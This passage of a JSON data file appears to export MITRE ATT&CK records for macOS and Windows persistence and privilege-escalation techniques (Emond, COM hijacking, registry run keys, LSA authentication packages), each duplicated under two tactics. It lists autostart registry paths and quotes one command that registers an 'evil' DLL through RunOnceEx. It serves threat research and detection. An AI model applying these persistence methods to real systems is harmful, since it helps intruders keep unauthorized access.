    "technique": "Emond",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <!-- raw HTML omitted -->/sbin/emond<!-- raw HTML omitted --> will load any rules from the <!-- raw HTML omitted -->/etc/emond.d/rules/<!-- raw HTML omitted --> directory and take action once an explicitly defined event takes place.<!-- raw HTML omitted --><!-- raw HTML omitted -->The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <!-- raw HTML omitted -->/private/var/db/emondClients<!-- raw HTML omitted -->, specified in the <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> configuration file at<!-- raw HTML omitted -->/System/Library/LaunchDaemons/com.apple.emond.plist<!-- raw HTML omitted -->.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> service.</p>\n",
    "technique_references": [
      {
        "source_name": "xorrior emond Jan 2018",
        "url": "https://www.xorrior.com/emond-persistence/",
        "description": "Ross, Chris. (2018, January 17). Leveraging Emond on macOS For Persistence. Retrieved September 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "magnusviri emond Apr 2016",
        "url": "http://www.magnusviri.com/Mac/what-is-emond.html",
        "description": "Reynolds, James. (2016, April 7). What is emond?. Retrieved September 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "sentinelone macos persist Jun 2019",
        "url": "https://www.sentinelone.com/blog/how-malware-persists-on-macos/",
        "description": "Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS. Retrieved September 10, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd",
    "platform": "macos",
    "tid": "T1546.014",
    "technique": "Emond",
    "tactic": "persistence",
    "datasources": "file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <!-- raw HTML omitted -->/sbin/emond<!-- raw HTML omitted --> will load any rules from the <!-- raw HTML omitted -->/etc/emond.d/rules/<!-- raw HTML omitted --> directory and take action once an explicitly defined event takes place.<!-- raw HTML omitted --><!-- raw HTML omitted -->The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <!-- raw HTML omitted -->/private/var/db/emondClients<!-- raw HTML omitted -->, specified in the <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> configuration file at<!-- raw HTML omitted -->/System/Library/LaunchDaemons/com.apple.emond.plist<!-- raw HTML omitted -->.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the <a href=\"https://attack.mitre.org/techniques/T1543/004\">Launch Daemon</a> service.</p>\n",
    "technique_references": [
      {
        "source_name": "xorrior emond Jan 2018",
        "url": "https://www.xorrior.com/emond-persistence/",
        "description": "Ross, Chris. (2018, January 17). Leveraging Emond on macOS For Persistence. Retrieved September 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "magnusviri emond Apr 2016",
        "url": "http://www.magnusviri.com/Mac/what-is-emond.html",
        "description": "Reynolds, James. (2016, April 7). What is emond?. Retrieved September 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "sentinelone macos persist Jun 2019",
        "url": "https://www.sentinelone.com/blog/how-malware-persists-on-macos/",
        "description": "Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS. Retrieved September 10, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
    "platform": "windows",
    "tid": "T1546.015",
    "technique": "Component Object Model Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary’s code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Component Object Model",
        "url": "https://msdn.microsoft.com/library/ms694363.aspx",
        "description": "Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GDATA COM Hijacking",
        "url": "https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence",
        "description": "G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame COM Hijacking",
        "url": "https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com",
        "description": "Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
    "platform": "windows",
    "tid": "T1546.015",
    "technique": "Component Object Model Hijacking",
    "tactic": "persistence",
    "datasources": "dll-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary’s code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Component Object Model",
        "url": "https://msdn.microsoft.com/library/ms694363.aspx",
        "description": "Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "GDATA COM Hijacking",
        "url": "https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence",
        "description": "G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame COM Hijacking",
        "url": "https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com",
        "description": "Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
    "platform": "windows",
    "tid": "T1547.001",
    "technique": "Registry Run Keys / Startup Folder",
    "tactic": "persistence",
    "datasources": "file-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the “run keys” in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account’s associated permissions level.<!-- raw HTML omitted --><!-- raw HTML omitted -->Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <!-- raw HTML omitted -->C:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup<!-- raw HTML omitted -->. The startup folder path for all users is <!-- raw HTML omitted -->C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->The following run keys are created by default on Windows systems:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx<!-- raw HTML omitted --> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a “Depend” key with RunOnceEx: <!-- raw HTML omitted -->reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d “C:\\temp\\evil[.]dll”<!-- raw HTML omitted --> (Citation: Oddvar Moe RunOnceEx Mar 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->The following Registry keys can be used to set startup folder items for persistence:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->The following Registry keys can control automatic startup of services during boot:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit<!-- raw HTML omitted --> and <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell<!-- raw HTML omitted --> subkeys can automatically launch programs.<!-- raw HTML omitted --><!-- raw HTML omitted -->Programs listed in the load value of the registry key <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<!-- raw HTML omitted --> run when any user logs on.<!-- raw HTML omitted --><!-- raw HTML omitted -->By default, the multistring <!-- raw HTML omitted -->BootExecute<!-- raw HTML omitted --> value of the registry key <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager<!-- raw HTML omitted --> is set to <!-- raw HTML omitted -->autocheck autochk *<!-- raw HTML omitted -->. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to make the Registry entries look as if they are associated with legitimate programs.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/270.html",
        "description": "none",
        "external_id": "CAPEC-270"
      },
      {
        "source_name": "Microsoft Run Key",
        "url": "http://msdn.microsoft.com/en-us/library/aa376977",
        "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Wow6432Node 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
        "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Malwarebytes Wow6432Node 2016",
        "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
        "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft RunOnceEx APR 2018",
        "url": "https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key",
        "description": "Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe RunOnceEx Mar 2018",
        "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/",
        "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
    "platform": "windows",
    "tid": "T1547.001",
    "technique": "Registry Run Keys / Startup Folder",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the “run keys” in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account’s associated permissions level.<!-- raw HTML omitted --><!-- raw HTML omitted -->Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <!-- raw HTML omitted -->C:\\Users[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup<!-- raw HTML omitted -->. The startup folder path for all users is <!-- raw HTML omitted -->C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->The following run keys are created by default on Windows systems:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx<!-- raw HTML omitted --> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a “Depend” key with RunOnceEx: <!-- raw HTML omitted -->reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d “C:\\temp\\evil[.]dll”<!-- raw HTML omitted --> (Citation: Oddvar Moe RunOnceEx Mar 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->The following Registry keys can be used to set startup folder items for persistence:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->The following Registry keys can control automatic startup of services during boot:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit<!-- raw HTML omitted --> and <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell<!-- raw HTML omitted --> subkeys can automatically launch programs.<!-- raw HTML omitted --><!-- raw HTML omitted -->Programs listed in the load value of the registry key <!-- raw HTML omitted -->HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<!-- raw HTML omitted --> run when any user logs on.<!-- raw HTML omitted --><!-- raw HTML omitted -->By default, the multistring <!-- raw HTML omitted -->BootExecute<!-- raw HTML omitted --> value of the registry key <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager<!-- raw HTML omitted --> is set to <!-- raw HTML omitted -->autocheck autochk *<!-- raw HTML omitted -->. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to make the Registry entries look as if they are associated with legitimate programs.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/270.html",
        "description": "none",
        "external_id": "CAPEC-270"
      },
      {
        "source_name": "Microsoft Run Key",
        "url": "http://msdn.microsoft.com/en-us/library/aa376977",
        "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Wow6432Node 2018",
        "url": "https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry",
        "description": "Microsoft. (2018, May 31). 32-bit and 64-bit Application Data in the Registry. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Malwarebytes Wow6432Node 2016",
        "url": "https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/",
        "description": "Arntz, P. (2016, March 30). Hiding in Plain Sight. Retrieved August 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft RunOnceEx APR 2018",
        "url": "https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key",
        "description": "Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe RunOnceEx Mar 2018",
        "url": "https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/",
        "description": "Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec",
    "platform": "windows",
    "tid": "T1547.002",
    "technique": "Authentication Package",
    "tactic": "persistence",
    "datasources": "dll-monitoring|loaded-dlls|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&lt;/code&gt; with the key value of <!-- raw HTML omitted -->”Authentication Packages”=&lt;target binary&gt;<!-- raw HTML omitted -->. The binary will then be executed by the system when the authentication packages are loaded.</p>\n",
    "technique_references": [
      {
        "source_name": "MSDN Authentication Packages",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
        "description": "Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b8cfed42-6a8a-4989-ad72-541af74475ec",
    "platform": "windows",
    "tid": "T1547.002",
    "technique": "Authentication Package",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|loaded-dlls|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <!-- raw HTML omitted -->HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&lt;/code&gt; with the key value of <!-- raw HTML omitted -->”Authentication Packages”=&lt;target binary&gt;<!-- raw HTML omitted -->. The binary will then be executed by the system when the authentication packages are loaded.</p>\n",
    "technique_references": [
      {
        "source_name": "MSDN Authentication Packages",
        "url": "https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx",
        "description": "Microsoft. (n.d.). Authentication Packages. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Graeber 2014",
        "url": "http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html",
        "description": "Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Configure LSA",
        "url": "https://technet.microsoft.com/en-us/library/dn408187.aspx",
        "description": "Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved June 24, 2015.",
